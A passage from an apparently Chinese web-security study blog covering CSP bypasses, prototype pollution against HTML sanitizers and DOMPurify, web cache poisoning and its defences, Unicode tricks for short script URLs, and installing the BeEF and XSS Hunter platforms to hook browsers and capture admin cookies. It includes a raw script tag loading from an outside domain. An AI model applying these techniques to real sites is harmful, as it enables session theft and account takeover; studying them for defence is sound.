&lt;li&gt;在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录&lt;/li&gt;
&lt;li&gt;在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）&lt;/li&gt;
&lt;li&gt;有特别的方式可以跨域发送请求，或者有站内域可以接受请求&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s&#34;&gt;CSP 浅析与绕过 - SecPulse.COM | 安全脉搏&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CRLF 文件头&lt;/p&gt;
&lt;p&gt;当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s&#34;&gt;我的 CSP 绕过思路及总结 | CN-SEC 中文网&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k&#34;&gt;📎通过浏览器缓存来 bypass CSP script nonce.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;条件&lt;/p&gt;
&lt;p&gt;1. 开启缓存，nonce 保存在本地  &lt;code&gt;header( &#39;cache-Control: max-age=99999999 &#39; );&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串&lt;/p&gt;
&lt;p&gt;2. 有 document.write ，截断 href，只会保存 #前面的内容&lt;/p&gt;
&lt;p&gt;3.textarea nonce，textarea 中只能容纳文本&lt;/p&gt;
&lt;p&gt;4.ajax 无刷新&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script nonce=&amp;#x27;&amp;lt;?php echo $random;?&amp;gt;&amp;#x27;&amp;gt;document.write(&amp;#x27;URL &amp;#x27; + unescape(location.href))&amp;lt;/script&amp;gt;&amp;lt;script nonce=&amp;#x27;&amp;lt;?php echo $random;?&amp;gt;&amp;#x27;&amp;gt;console.log(&amp;#x27;another nonced script&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后我们需要利用 iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 &lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;  标签来吃掉后面的 script 标签，这样就可以获取内容。&lt;/p&gt;
&lt;p&gt;然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。&lt;/p&gt;
&lt;p&gt;唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png&#34; alt=&#34;image-20221013171141247&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png&#34; alt=&#34;image-20221013171233853&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;原型链污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原型链污染&#34;&gt;#&lt;/a&gt; 原型链污染&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k&#34;&gt;📎原型污染 - 并绕过客户端 HTML sanitizer.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为&lt;strong&gt;基于原型的继承&lt;/strong&gt;，JavaScript 中的每个对象都有一个原型（也可以是 &lt;code&gt;null&lt;/code&gt; ）。如果我们不指定它，默认情况下对象的原型是 &lt;code&gt;Object.prototype&lt;/code&gt; ，通过 object.prototype 检查对象的属性。&lt;/p&gt;
&lt;p&gt;当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 &lt;code&gt;null&lt;/code&gt; . 它被称为原型链。&lt;/p&gt;
&lt;p&gt;如果我们能以某种方式&lt;strong&gt;污染 Object.prototype&lt;/strong&gt;（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;const user = &amp;#123; userid: 123 &amp;#125;;if (user.admin) &amp;#123;  console.log(&amp;#x27;You are an admin&amp;#x27;);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当前 user 没有 admin 的属性，但如果我们污染了 &lt;code&gt;Object.prototype&lt;/code&gt;  和定义名为的属性 &lt;code&gt;admin&lt;/code&gt; ，那么 &lt;code&gt;console.log&lt;/code&gt;  将执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Object.prototype.admin = true;const user = &amp;#123; userid: 123 &amp;#125;;if (user.admin) &amp;#123;  console.log(&amp;#x27;You are an admin&amp;#x27;); // this will execute&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此漏洞的入口点通常是合并操作（即将一个对象的所有属性复制到另一个对象）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;const obj1 = &amp;#123; a: 1, b: 2 &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;recursiveMerge(obj1, obj2); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;递归合并的基本流程是：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1. 遍历 obj2 的所有属性并检查它们是否存在于`obj1`.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. 如果存在属性，则对该属性执行合并操作。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. 如果属性不存在，则将其从 复制`obj2`到`obj1`。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果用户对要合并的对象有任何控制权，那么通常其中一个对象来自 &lt;code&gt;JSON.parse&lt;/code&gt; . And &lt;code&gt;JSON.parse&lt;/code&gt;  有点特别，因为它被视为 &lt;code&gt;__proto__&lt;/code&gt; “普通” 属性，即没有作为原型访问器的特殊含义&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1024x219.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问 &lt;code&gt;obj1.__proto__&lt;/code&gt; 返回 &lt;code&gt;Object.prototype&lt;/code&gt; （ &lt;code&gt;__proto__&lt;/code&gt; 返回原型的特殊属性也是如此），同时 &lt;code&gt;obj2.__proto__&lt;/code&gt; 包含 JSON 中给出的值，即： &lt;code&gt;123&lt;/code&gt; . 这证明了 &lt;code&gt;__proto__&lt;/code&gt; 属性的处理方式与 &lt;code&gt;JSON.parse&lt;/code&gt;  普通 JavaScript 不同。&lt;/p&gt;
&lt;p&gt;所以现在想象一个 &lt;code&gt;recursiveMerge&lt;/code&gt;  合并两个对象的函数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;obj1=&amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;obj2=JSON.parse(&#39;&amp;#123;&amp;quot;__proto__&amp;quot;:&amp;#123;&amp;quot;x&amp;quot;:1&amp;#125;&amp;#125;&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;遍历 &lt;code&gt;obj2&lt;/code&gt; . 唯一的属性是 &lt;code&gt;__proto__&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;检查是否 &lt;code&gt;obj1.__proto__&lt;/code&gt; 存在。确实如此。&lt;/li&gt;
&lt;li&gt;遍历 &lt;code&gt;obj2.__proto__&lt;/code&gt; . 唯一的属性是 &lt;code&gt;x&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;赋值： &lt;code&gt;obj1.__proto__.x = obj2.__proto__.x&lt;/code&gt; 。因为 &lt;code&gt;obj1.__proto__&lt;/code&gt; 指向 &lt;code&gt;Object.prototype&lt;/code&gt; ，则原型被污染。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在许多流行的 JS 库中都发现了这种类型的错误，包括&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNDUwMjAy&#34;&gt; lodash&lt;/span&gt; 或&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zbnlrLmlvL2Jsb2cvYWZ0ZXItdGhyZWUteWVhcnMtb2Ytc2lsZW5jZS1hLW5ldy1qcXVlcnktcHJvdG90eXBlLXBvbGx1dGlvbi12dWxuZXJhYmlsaXR5LWVtZXJnZXMtb25jZS1hZ2Fpbi8=&#34;&gt; jQuery&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;所有公开的利用原型污染的例子都集中在 NodeJS 上，其目标是实现远程代码执行。&lt;/p&gt;
&lt;h3 id=&#34;通过原型链污染bypass-html-sanitizer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过原型链污染bypass-html-sanitizer&#34;&gt;#&lt;/a&gt; 通过原型链污染 bypass HTML sanitizer&lt;/h3&gt;
&lt;p&gt;想象一下，我们有一个只允许 &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;  和 &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt;  标签的 sanitizer。如果我们用以下标记：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h1&amp;gt;Header&amp;lt;/h1&amp;gt;This is &amp;lt;b&amp;gt;some&amp;lt;/b&amp;gt; &amp;lt;i&amp;gt;HTML&amp;lt;/i&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它应该将其清理为以下形式：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h1&amp;gt;Header&amp;lt;/h1&amp;gt;This is &amp;lt;b&amp;gt;some&amp;lt;/b&amp;gt; HTML&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;HTML sanitizer 需要维护允许的元素属性和元素列表。基本上，库通常采用以下两种方式之一来存储列表：&lt;/p&gt;
&lt;p&gt;该库可能有一个包含允许元素列表的数组，例如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;const ALLOWED_ELEMENTS = [&amp;quot;h1&amp;quot;, &amp;quot;i&amp;quot;, &amp;quot;b&amp;quot;, &amp;quot;div&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后检查是否允许某些元素，他们只需调用 &lt;code&gt;ALLOWED_ELEMENTS.includes(element)&lt;/code&gt; . 这种方法可以避免原型污染，因为我们不能扩展数组；也就是说，我们不能污染 &lt;code&gt;length&lt;/code&gt;  属性，也不能污染已经存在的索引。即使使用 &lt;code&gt; Object.prototype.length = 10;Object.prototype[0] = &#39;test&#39;;&lt;/code&gt; , 然后 &lt;code&gt;ALLOWED_ELEMENTS.length&lt;/code&gt;  仍然返回 &lt;code&gt;4&lt;/code&gt;  并且 &lt;code&gt;ALLOWED_ELEMENTS[0]&lt;/code&gt;  仍然是 &lt;code&gt;&amp;quot;h1&amp;quot;&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;另一种解决方案是存储一个包含允许元素的对象，例如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;const ALLOWED_ELEMENTS = &amp;#123; &amp;quot;h1&amp;quot;: true, &amp;quot;i&amp;quot;: true, &amp;quot;b&amp;quot;: true, &amp;quot;div&amp;quot; :true&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后检查是否允许某些元素，库可能会检查 &lt;code&gt;ALLOWED_ELEMENTS[element]&lt;/code&gt; . 这种方法很容易通过原型污染加以利用；因为如果我们通过以下方式污染原型：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Object.prototype.SCRIPT = true;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后 &lt;code&gt;ALLOWED_ELEMENTS[&amp;quot;SCRIPT&amp;quot;]&lt;/code&gt;  返回 &lt;code&gt;true&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427192220087.png&#34; alt=&#34;image-20220427192220087&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;通过原型链污染bypass-dompurify&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过原型链污染bypass-dompurify&#34;&gt;#&lt;/a&gt; 通过原型链污染 bypass DOMPurify&lt;/h3&gt;
&lt;p&gt;与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;      /* Set configuration parameters */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_TAGS = &amp;#x27;ALLOWED_TAGS&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_ATTR = &amp;#x27;ALLOWED_ATTR&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 JavaScript 中 &lt;code&gt;in&lt;/code&gt; ，运算符遍历原型链。因此 &lt;code&gt;&#39;ALLOWED_ATTR&#39; in cfg&lt;/code&gt; ，如果此属性存在于 &lt;code&gt;Object.prototype&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;DOMPurify 默认允许使用 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  标签，因此该漏洞利用只需要 &lt;code&gt;ALLOWED_ATTR&lt;/code&gt;  使用 &lt;code&gt;onerror&lt;/code&gt;  和进行污染 &lt;code&gt;src&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;其他通过原型链污染 bypass xss 过滤框架不在叙述，可以到参考文献中查看&lt;/p&gt;
&lt;h3 id=&#34;ctf案例原型链污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ctf案例原型链污染&#34;&gt;#&lt;/a&gt; CTF 案例：原型链污染&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s&#34;&gt;深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;难度太大，就不班门弄斧了…&lt;/p&gt;
&lt;h2 id=&#34;缓存投毒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#缓存投毒&#34;&gt;#&lt;/a&gt; 缓存投毒&lt;/h2&gt;
&lt;p&gt;Web 缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015170751343.png&#34; alt=&#34;image-20221015170751343&#34;&gt;&lt;/p&gt;
&lt;p&gt;缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。可以使用 Varnish 或 CDN 设置网站的缓存&lt;/p&gt;
&lt;p&gt;每当缓存服务收到对资源的请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。&lt;/p&gt;
&lt;p&gt;确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题；对请求进行逐字节匹配的做法是完全无效的，因为 HTTP 请求充满了无关紧要的数据，例如请求头中的 User-Agent 字段&lt;/p&gt;
&lt;p&gt;缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源，但可能导致缓存系统错误认为两个缓存键相同但其他参数不同的请求是等效的，将返回错误的数据。&lt;/p&gt;
&lt;p&gt;Web 缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015171200570.png&#34; alt=&#34;image-20221015171200570&#34;&gt;&lt;/p&gt;
&lt;p&gt;非缓存键出现在错误的地方，可以来自于 HTTP 请求头，HTTP 响应，路由，DOM 等。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220427202534867.png&#34; alt=&#34;image-20220427202534867&#34;&gt;&lt;/p&gt;
&lt;p&gt;识别缓存键可以使用如下插件～：burpsuite param miner&lt;/p&gt;
&lt;p&gt;详细可以看这个文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2&#34;&gt;https://www.anquanke.com/post/id/156356&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对应的 burpsuite 也有相应的靶场&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmc=&#34;&gt;Web cache poisoning | Web Security Academy (portswigger.net)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;防御：&lt;/p&gt;
&lt;p&gt;针对缓存投毒的最强大防御办法就是禁用缓存。&lt;/p&gt;
&lt;p&gt;如果您对确定哪些内容是 “静态” 的足够确认，那么只对纯静态的响应进行缓存也是有效的。&lt;/p&gt;
&lt;p&gt;同样，避免从请求头和 cookie 中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的请求头。&lt;/p&gt;
&lt;p&gt;一旦在应用程序中识别出非缓存键的输入，理想的解决方案就是彻底禁用它们。&lt;/p&gt;
&lt;p&gt;最后，无论您的应用程序是否使用缓存技术，你的某些客户端可能在其末端都存在缓存，因此不应忽视 HTTP 请求头中的 XSS 等客户端漏洞。&lt;/p&gt;
&lt;h2 id=&#34;奇技淫巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#奇技淫巧&#34;&gt;#&lt;/a&gt; 奇技淫巧&lt;/h2&gt;
&lt;h3 id=&#34;1通过特殊字符绕过或缩短playload和src长度&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1通过特殊字符绕过或缩短playload和src长度&#34;&gt;#&lt;/a&gt; 1. 通过特殊字符绕过或缩短 playload 和 src 长度&lt;/h3&gt;
&lt;p&gt;利用浏览器对 Unicode 兼容性构造 script 中短 src&lt;/p&gt;
&lt;script src=//℡℠.㎺&gt;

浏览器可以解析为telsm.pw，但length只有4个字符

https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names

https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html

ſ

ß

TEL

SR

PW

![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)

利用浏览器对UNiocode支持

![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)

### 1.1 案例：emersion of XSS with 20 characters limitation

### 1.Xss platform

### 1.1beef-xss

安装：`apt-get install beef-xss`

注意事项：

几种常见的安装报错：

1.更新apt源

![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)



解决方法：`apt-get update ` `sudo apt-get upgrade`

2.缺省依赖

![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)

解决方法:`apt-get install libglib2.0-dev `

安装完之后在进行`apt-get install beef-xss`



beef默认路径：`http://127.0.0.1:3000/ui/panel`

![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)



使用pkav测试：

使用系统提供的payload

![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)

![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)

此时再去beef panel查看

![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)

说明此时已经上线，可以在command中找到命令执行：

说明：

- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行
- 橙色模块：模块可用，但结果对用户可见
- 灰色模块：模块为在目标浏览器上测试过

最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录

![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)

### 2.XSS-hunter

https://xsshunter.com/

1.进行注册

![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)

2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload

![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)

3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies

![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)



### 2.1 在centos上安装beef-xss

参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)

但有些需要注意的点

1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功

我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd ~/.rvm/archives&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。

